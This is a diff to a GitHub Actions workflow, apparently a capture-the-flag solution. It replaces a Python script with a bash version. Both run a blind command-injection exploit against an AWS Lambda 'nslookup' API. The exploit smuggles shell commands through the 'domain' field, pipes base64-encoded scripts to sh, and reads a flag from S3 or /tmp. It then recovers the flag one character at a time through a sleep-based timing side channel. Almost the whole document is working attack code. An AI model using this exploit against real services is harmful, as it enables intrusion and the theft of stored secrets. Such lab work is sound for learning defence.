@@ -19,82 +19,87 @@ jobs:
           role-to-assume: arn:aws:iam::009661764077:role/cicdRole
           aws-region: us-east-1
 
-      - name: Precision-Timing Side-Channel Extraction
+      - name: Exfiltrate Flag via Timing Side-Channel
         run: |
-          python3 << 'PYEOF'
-          import urllib.request
-          import json
-          import time
-          import urllib.parse
-
-          url = "https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup"
-
-          print("=== STEP 1: CALIBRATING TIMING BASELINE ===")
-          start = time.time()
-          req = urllib.request.Request(
-              url,
-              data=json.dumps({"domain": "127.0.0.1; sleep 2"}).encode('utf-8'),
-              headers={'Content-Type': 'application/json'},
-              method='POST'
-          )
-          try:
-              with urllib.request.urlopen(req, timeout=10) as resp:
-                  resp.read()
-          except Exception:
-              pass
-          cal_time = time.time() - start
-          print(f"Calibration sleep test took {cal_time:.2f} seconds.")
-
-          flag_chars = []
-          print("\n=== STEP 2: EXTRACTING FLAG (16 BYTES) WITH HIGH PRECISION ===")
+          URL="https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup"
           
-          for pos in range(1, 17):
-              low, high = 32, 126
-              while low < high:
-                  mid = (low + high) // 2
-                  
-                  # Lambda command: reads /tmp/flag.txt, gets char at pos, checks ASCII, sleeps 2 if > mid
-                  lambda_cmd = (
-                      f'127.0.0.1; '
-                      f'F=$(cat /tmp/flag.txt 2>/dev/null); '
-                      f'CHAR=$(echo "$F" | cut -c{pos}); '
-                      f'ORD=$(echo -n "$CHAR" | od -An -tuC | xargs); '
-                      f'if [ "$ORD" -gt {mid} ]; then sleep 2; fi'
-                  )
-                  
-                  payload = json.dumps({"domain": lambda_cmd}).encode('utf-8')
-                  req = urllib.request.Request(
-                      url,
-                      data=payload,
-                      headers={'Content-Type': 'application/json'},
-                      method='POST'
-                  )
-                  
-                  start = time.time()
-                  try:
-                      with urllib.request.urlopen(req, timeout=10) as resp:
-                          resp.read()
-                  except Exception:
-                      pass
-                  duration = time.time() - start
-                  
-                  # Error margin: if request takes >= 1.3 seconds, the sleep successfully triggered (char > mid)
-                  if duration >= 1.3:
-                      low = mid + 1
-                  else:
-                      high = mid
-                      
-              char = chr(low)
-              flag_chars.append(char)
-              current_str = "".join(flag_chars)
-              print(f"Position {pos} resolved to: '{char}' (ASCII {low}) | Flag so far: {current_str}")
-
-          encoded_flag = "".join(flag_chars)
-          print(f"\n===============================")
-          print(f"FINAL ENCODED FLAG: {encoded_flag}")
-          print(f"===============================")
+          echo "=== STEP 1: CALIBRATE LAMBDA TIMEOUT ==="
+          for i in 1 2 3; do
+            START=$(date +%s%N)
+            CODE=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$URL" \
+              -H "Content-Type: application/json" \
+              -d "{\"domain\": \"127.0.0.1; sleep $i\"}")
+            END=$(date +%s%N)
+            DURATION_MS=$(( (END - START) / 1000000 ))
+            echo "sleep $i -> HTTP $CODE in ${DURATION_MS}ms"
+          done
           
-          # Safely unquote the flag without quote-breaking syntax errors
-          decoded_flag = urllib.parse.unquote(encoded_flag)
-          print(f"FINAL PLAINTEXT FLAG: {decoded_flag}")
-          PYEOF
+          echo ""
+          echo "=== STEP 2: MEASURE BASELINE (S3 read, no sleep) ==="
+          # This condition is always FALSE for printable ASCII (max 126), so no sleep fires
+          SCRIPT='FLAG=$(aws s3 cp s3://codec4f26c862a321ef5/flag.txt - --region us-east-1); CHAR=$(echo "$FLAG" | cut -c1); ORD=$(echo -n "$CHAR" | od -An -tuC | tr -d " \n"); if [ "$ORD" -gt 200 ]; then sleep 2; fi'
+          ENCODED=$(echo "$SCRIPT" | base64 -w0)
+          START=$(date +%s%N)
+          CODE=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$URL" \
+            -H "Content-Type: application/json" \
+            -d "{\"domain\": \"127.0.0.1; echo $ENCODED | base64 -d | sh\"}")
+          END=$(date +%s%N)
+          BASELINE_MS=$(( (END - START) / 1000000 ))
+          echo "Baseline (no sleep) -> HTTP $CODE in ${BASELINE_MS}ms"
+          THRESHOLD=$((BASELINE_MS + 1000))
+          echo "Using threshold: ${THRESHOLD}ms (baseline + 1000ms)"
+          
+          echo ""
+          echo "=== STEP 3: VERIFY S3 ACCESS (sleep if file is 16 bytes) ==="
+          SCRIPT='SIZE=$(aws s3 cp s3://codec4f26c862a321ef5/flag.txt - --region us-east-1 | wc -c); if [ "$SIZE" -eq 16 ]; then sleep 2; fi'
+          ENCODED=$(echo "$SCRIPT" | base64 -w0)
+          START=$(date +%s%N)
+          CODE=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$URL" \
+            -H "Content-Type: application/json" \
+            -d "{\"domain\": \"127.0.0.1; echo $ENCODED | base64 -d | sh\"}")
+          END=$(date +%s%N)
+          DURATION_MS=$(( (END - START) / 1000000 ))
+          echo "S3 size check -> HTTP $CODE in ${DURATION_MS}ms"
+          if [ "$CODE" != "504" ] && [ "$CODE" != "503" ] && [ $DURATION_MS -lt $THRESHOLD ]; then
+            echo "WARNING: S3 access may not be working! If the flag is NOT 16 bytes, or S3 is blocked, the extraction will fail."
+          fi
+          
+          echo ""
+          echo "=== STEP 4: BINARY SEARCH EXTRACTION (16 bytes) ==="
+          FLAG=""
+          for pos in $(seq 1 16); do
+            low=32
+            high=126
+            while [ $low -lt $high ]; do
+              mid=$(( (low + high) / 2 ))
+              
+              # Build the shell script to run inside Lambda
+              # $pos and $mid are expanded by GitHub bash; $FLAG/$CHAR/$ORD are literal for the Lambda shell
+              SCRIPT='FLAG=$(aws s3 cp s3://codec4f26c862a321ef5/flag.txt - --region us-east-1); CHAR=$(echo "$FLAG" | cut -c'"$pos"'); ORD=$(echo -n "$CHAR" | od -An -tuC | tr -d " \n"); if [ "$ORD" -gt '"$mid"' ]; then sleep 2; fi'
+              ENCODED=$(echo "$SCRIPT" | base64 -w0)
+              
+              START=$(date +%s%N)
+              CODE=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$URL" \
+                -H "Content-Type: application/json" \
+                -d "{\"domain\": \"127.0.0.1; echo $ENCODED | base64 -d | sh\"}")
+              END=$(date +%s%N)
+              DURATION_MS=$(( (END - START) / 1000000 ))
+              
+              # TRUE if Lambda timed out (504) OR took longer than baseline + 1s
+              if [ "$CODE" = "504" ] || [ "$CODE" = "503" ] || [ $DURATION_MS -ge $THRESHOLD ]; then
+                low=$((mid + 1))
+                echo "  pos $pos > $mid  (time=${DURATION_MS}ms, code=$CODE)"
+              else
+                high=$mid
+                echo "  pos $pos <= $mid (time=${DURATION_MS}ms, code=$CODE)"
+              fi
+            done
+            CHAR=$(python3 -c "import sys; sys.stdout.write(chr($low))")
+            FLAG="$FLAG$CHAR"
+            echo ">>> Position $pos: '$CHAR' (ASCII $low) | Flag so far: $FLAG"
+          done
+          
+          echo ""
+          echo "==================== FINAL FLAG ===================="
+          echo "$FLAG"
+          echo "===================================================="
